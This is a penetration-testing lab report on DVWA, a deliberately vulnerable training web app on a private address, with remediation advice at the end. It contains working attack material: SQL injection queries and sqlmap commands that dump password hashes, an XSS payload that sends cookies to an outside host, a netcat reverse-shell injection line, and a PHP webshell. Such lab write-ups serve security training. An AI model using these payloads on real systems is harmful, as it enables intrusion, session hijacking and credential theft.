# Web Attacks Report - Day 3

## General Information
- **Date**: Wednesday 25 March 2026
- **Target**: DVWA (http://172.22.0.30)
- **Author**: Laurent Zang

## Executive Summary
Successfully performed comprehensive web application penetration testing on DVWA. The following vulnerabilities were identified and exploited: SQL Injection (extracted all user credentials), Reflected XSS (cookie theft), Command Injection (arbitrary command execution), and File Upload (webshell deployment). All exploits were performed with security level set to "low".

## Reconnaissance
### Technologies Identified
whatweb http://172.22.0.30
http://172.22.0.30 [200 OK] Apache[2.4.25], PHP[5.6.30], X-Powered-By[PHP/5.6.30]
text


## SQL Injection (A03:2021 - Injection)

### Vulnerable Parameter
- **URL**: http://172.22.0.30/vulnerabilities/sqli/
- **Parameter**: id
- **Method**: GET

### Manual Testing
```sql
# Test vulnerability
1' OR '1'='1

# Find number of columns
1' UNION SELECT 1,2 #

# Database information
1' UNION SELECT database(), user() #
Result: dvwa, app@localhost

# List tables
1' UNION SELECT table_name, 2 FROM information_schema.tables WHERE table_schema = 'dvwa' #
Result: guestbook, users

# List columns from users table
1' UNION SELECT column_name, 2 FROM information_schema.columns WHERE table_name = 'users' #
Result: user_id, first_name, last_name, user, password, avatar

# Extract credentials
1' UNION SELECT user, password FROM users #

Extracted Data
User	Password Hash (MD5)	Cracked Password
admin	5f4dcc3b5aa765d61d8327deb882cf99	password
gordonb	e99a18c428cb38d5f260853678922e03	abc123
1337	8d3533d75ae2c3966d7e0d4fcc69216b	charley
pablo	0d107d09f5bbe40cade3de5c71e9e9b7	letmein
smithy	5f4dcc3b5aa765d61d8327deb882cf99	password
Automated Exploitation (SQLMap)
bash

sqlmap -u "http://172.22.0.30/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="security=low; PHPSESSID=5d9kfpj0ta7q19o527pp3ndui0" --dbs
sqlmap -u "http://172.22.0.30/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="security=low; PHPSESSID=5d9kfpj0ta7q19o527pp3ndui0" -D dvwa --tables
sqlmap -u "http://172.22.0.30/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="security=low; PHPSESSID=5d9kfpj0ta7q19o527pp3ndui0" -D dvwa -T users --dump

Cross-Site Scripting (A03:2021 - Injection)
XSS Reflected

    Payload: <script>alert('XSS')</script>

    Result: Alert box displayed

    Cookie Stealer: <script>document.location='http://172.22.0.1:8080/?cookie='+document.cookie</script>

    Stolen Cookie: security=low; PHPSESSID=5d9kfpj0ta7q19o527pp3ndui0

XSS Stored

    Payload: <img src=x onerror=alert('XSS')>

    Result: Alert box displayed on page load

    Limitation: Cookie stealer payload blocked by filtering

Command Injection (A03:2021 - Injection)
Vulnerable Parameter

    URL: http://172.22.0.30/vulnerabilities/exec/

    Parameter: ip

    Method: POST

Payloads Tested
bash

# Basic command injection
127.0.0.1; whoami
Result: www-data

# Directory listing
127.0.0.1; ls -la
Result: help, index.php, source directories

# Reverse shell (theoretical)
127.0.0.1; nc -e /bin/sh 172.22.0.1 4444

Proof of Access
text

PING 127.0.0.1 (127.0.0.1): 56 data bytes
...
www-data
total 20
drwxr-xr-x 1 www-data www-data 4096 Oct 12  2018 .
drwxr-xr-x 1 www-data www-data 4096 Oct 12  2018 ..
drwxr-xr-x 1 www-data www-data 4096 Oct 12  2018 help
-rw-r--r-- 1 www-data www-data 1830 Oct 12  2018 index.php
drwxr-xr-x 1 www-data www-data 4096 Oct 12  2018 source

File Upload (Unrestricted File Upload)
Webshell Creation
php

<?php system($_GET["cmd"]); ?>

Upload Location

    Path: /hackable/uploads/shell.php

    URL: http://172.22.0.30/hackable/uploads/shell.php?cmd=whoami

Proof of Execution
bash

http://172.22.0.30/hackable/uploads/shell.php?cmd=whoami
Result: www-data

http://172.22.0.30/hackable/uploads/shell.php?cmd=ls%20-la
Result: dvwa_email.png, shell.php

MITRE ATT&CK Mapping
Tactic	Technique	ID	Observed
Initial Access	Exploit Public-Facing Application	T1190	✅ All attacks
Execution	Command and Scripting Interpreter	T1059	✅ Command Injection, Webshell
Credential Access	Credentials from Password Stores	T1555	✅ SQLi data extraction
Exfiltration	Exfiltration Over C2 Channel	T1041	✅ XSS cookie theft
OWASP Top 10 Mapping
Vulnerability	OWASP Category
SQL Injection	A03:2021 - Injection
XSS (Reflected/Stored)	A03:2021 - Injection
Command Injection	A03:2021 - Injection
Unrestricted File Upload	A04:2021 - Insecure Design
Impact Assessment
Vulnerability	Impact	CVSS Score (Est.)
SQL Injection	Critical - Full database access	9.8
Command Injection	Critical - Arbitrary code execution	9.8
File Upload	Critical - Remote code execution	9.8
XSS	Medium - Session hijacking	6.1
Recommendations

    SQL Injection Prevention: Use prepared statements (PDO) with parameterized queries

    XSS Prevention: Implement proper output encoding (htmlspecialchars) and Content Security Policy

    Command Injection Prevention: Avoid system calls; if necessary, use escapeshellcmd() with strict input validation

    File Upload Security: Implement whitelist of allowed extensions, validate file content (not just MIME type), store files outside webroot

    Input Validation: Implement server-side validation for all user inputs

    Web Application Firewall: Consider deploying WAF (e.g., ModSecurity) for additional protection

Appendix

    [hashes_md5.txt]

    [shell.php]

    [preuves.txt]

    [sqlmap-output.log]

Report generated by: Laurent Zang
Date: 25 March 2026

